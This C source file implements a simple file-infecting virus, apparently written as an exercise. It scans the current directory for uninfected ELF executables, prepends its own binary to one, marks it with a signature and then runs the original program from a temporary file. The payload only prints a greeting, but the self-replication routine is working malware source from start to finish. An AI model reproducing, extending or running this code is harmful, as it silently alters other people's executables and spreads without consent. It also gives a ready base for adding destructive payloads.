#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <elf.h>
#include <stdbool.h>
#include <sys/wait.h>

#define VIRUS_SIGNATURE 29471
#define VIRUS_SIZE 13880
#define TEMP_FILENAME ".tmpXXXXXX"

char* getHostFile(int virusInode);
bool isELFExecutable(char *hostFileName);
bool isInfected(char *hostFileName);
int infect(char *hostFileName, char *virus);
int executeHostFile(int infectedFileDescriptor, int infectedFileSize, char *argv[]);
void executePayload();


static int virusSignature = VIRUS_SIGNATURE;

int main(int argc, char *argv[]){
	
	struct stat virusSt;
	char virus[VIRUS_SIZE];
	char* hostFile;
	int virusFileDescriptor;	
	
	/* Read the file and find the stat*/
	virusFileDescriptor = open(argv[0], O_RDONLY, 0);
	if((read(virusFileDescriptor, virus, VIRUS_SIZE) != VIRUS_SIZE) < 0){
		return -1;
	}
	if(fstat(virusFileDescriptor, &virusSt) < 0){
		return -1;
	};
	
	executePayload();
		
	/* Retrieve host files to be infected from the current Directory */
	hostFile = getHostFile(virusSt.st_ino);
	
	/* Call function Infect if host file is not infected and ELF Executable */
	if(hostFile != NULL){
		infect(hostFile,virus);
	}
	
	if(virusSt.st_size != VIRUS_SIZE){
		executeHostFile(virusFileDescriptor,virusSt.st_size,argv);
	}
	
	close(virusFileDescriptor);
	return 0;
}

/* Function to retrieve host file in the current directory*/
char* getHostFile(int virusInode){
	
	DIR *directoryFiles;
	struct dirent *eachFile;	
	struct stat hostFileSt;
	int hostFileDescriptor;
	char* hostFileName = NULL;
		
	directoryFiles = opendir(".");
	
	/* Looping through the files retrieved in the directory */
	while ((eachFile = readdir(directoryFiles)) != NULL){
		
		/* Open the host file found */
		hostFileDescriptor = open(eachFile->d_name, O_RDWR, 0);
				
		if(hostFileDescriptor>=0){
			
			/* Find the stat of the host file */
			fstat(hostFileDescriptor, &hostFileSt);
			
			/* Check if self */
			if(hostFileSt.st_ino == virusInode){
				continue;
			}
			
			/* Check if the file is original virus file */
			if(hostFileSt.st_size == VIRUS_SIZE){
				continue;
			}
			
			/* Check if it is regular file */
			if(S_ISREG(hostFileSt.st_mode)){
				/* Check if host file is ELF executable and not infected */
				//int fileDescriptor = open(eachFile->d_name, O_RDWR, 0);
				
				if(isELFExecutable(eachFile->d_name) && !isInfected(eachFile->d_name)){
					hostFileName = eachFile->d_name;
					break;
				}				
			}			
		}
	}
	
	close(hostFileDescriptor);
	return hostFileName;
}

/* Function to check if the host file is ELF Executable */
bool isELFExecutable(char *hostFileName){
	int hostFileDescriptor;
	Elf32_Ehdr elfFileHeader;
	
	hostFileDescriptor = open(hostFileName, O_RDONLY, 0);
	
	if(hostFileDescriptor < 0){
		return false;
	}
	
	/* Reading the file in the variable to check the header value */
	if(read(hostFileDescriptor, &elfFileHeader, sizeof(elfFileHeader)) != sizeof(elfFileHeader)){
		return false;
	}
	
	/* Checking if the host file is ELF file */
	if(elfFileHeader.e_ident[0] != ELFMAG0 || elfFileHeader.e_ident[1] != ELFMAG1 || elfFileHeader.e_ident[2] != ELFMAG2 || elfFileHeader.e_ident[3] != ELFMAG3){
			return false;
	}
	
	close(hostFileDescriptor);
	return true;
}

/* Function to check if the file is infected */
bool isInfected(char *hostFileName){
	struct stat hostFileSt;
	int checkSignature;
	int hostFileDescriptor;
	int hostFileOffset;
	
	hostFileDescriptor = open(hostFileName, O_RDONLY, 0);
	
	if(hostFileDescriptor < 0){
		return false;
	} 
	
	if(fstat(hostFileDescriptor, &hostFileSt) < 0){
		return false;
	}
	
	/* Moving the pointer to the star of the virus signature if any using offset */
	hostFileOffset = hostFileSt.st_size - sizeof(virusSignature);

	if(lseek(hostFileDescriptor, hostFileOffset, SEEK_SET) != hostFileOffset){
		return false;
	}
	
	/* Reading the Virus Signature in the variable */
	if(read(hostFileDescriptor, &checkSignature, sizeof(virusSignature)) != sizeof(virusSignature)){
		return false;
	}

	/* Checking if the file is infected */
	if(checkSignature == VIRUS_SIGNATURE){
		return true;
	}
	
	close(hostFileDescriptor);
	return false;
}

/* Function to infect the host */
int infect(char *hostFileName, char *virus){
	int hostFileDescriptor;
	int tempFileDescriptor;
	char *hostFile;
	struct stat hostFileSt;
	
	hostFileDescriptor = open(hostFileName, O_RDWR, 0);
	
	if(hostFileDescriptor < 0){
		return -1;
	}
	
	if(fstat(hostFileDescriptor, &hostFileSt) < 0){
		return -1;
	}

	/* Creating temporary file to write the virus */
	tempFileDescriptor = creat(TEMP_FILENAME,hostFileSt.st_mode);
	if(tempFileDescriptor < 0){
		return -1;
	}

	/* Allocating buffer for host file to append with the virus */
	hostFile = (char *)malloc(hostFileSt.st_size);
	if(hostFile == NULL){
		return -1;
	}

	/* Reading the host file ino the buffer allocated */
	if(read(hostFileDescriptor, hostFile, hostFileSt.st_size) != hostFileSt.st_size){
		return -1;
	}
	
	/* Writing Virus at the start of the  temp file */
	if(write(tempFileDescriptor, virus, VIRUS_SIZE) != VIRUS_SIZE){
		return -1;
	}

	/* Append the host file in the temp file */
	if(write(tempFileDescriptor, hostFile, hostFileSt.st_size) != hostFileSt.st_size){
		return -1;
	}
		
	/* Writing virus signature at the end of the file to identify the infection */
	if(write(tempFileDescriptor, &virusSignature, sizeof(virusSignature)) != sizeof(virusSignature)){
		return -1;
	}
	
	
	if(rename(TEMP_FILENAME, hostFileName) < 0){
		return -1;
	}

	/* Closing the file Descriptor */
	close(tempFileDescriptor);
	close(hostFileDescriptor);
	free(hostFile);
	
	return 0;
}

/* Execute the virus Payload */
void executePayload(){
	printf("Hello! I am a simple virus!\n");
}

/* Execute the Host File operation */
int executeHostFile(int infectedFileDescriptor, int infectedFileSize, char *argv[]){
	char *hostFile;
	int hostFileSize;
	int hostFileDescriptor;
	struct stat infectedFileSt;
	pid_t pid;
	
	
	if(fstat(infectedFileDescriptor, &infectedFileSt) < 0){
		return -1;
	};
	
	if (lseek(infectedFileDescriptor, VIRUS_SIZE, SEEK_SET) != VIRUS_SIZE){
		return -1;
	}
	
	hostFile = (char *)malloc(infectedFileSt.st_size);
	if(hostFile == NULL){
		return -1;
	}

	hostFileSize = infectedFileSize - VIRUS_SIZE - sizeof(virusSignature);
	
	/* Reading the host file in the buffer allocated */
	if(read(infectedFileDescriptor, hostFile, hostFileSize) != hostFileSize){
		return -1;
	}
	
	close(infectedFileDescriptor);
	
	/* Creating the temporary file to execute*/
	hostFileDescriptor = creat(TEMP_FILENAME,infectedFileSt.st_mode);
	if(hostFileDescriptor < 0){
		return -1;
	}
	
	/* Writing the original host executable file in the buffer */
	if(write(hostFileDescriptor, hostFile, hostFileSize) != hostFileSize){
		return -1;
	}
	
	close(hostFileDescriptor);
	free(hostFile);
	
	/* Create separate process to run the original host file */
	pid = fork();
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
	
}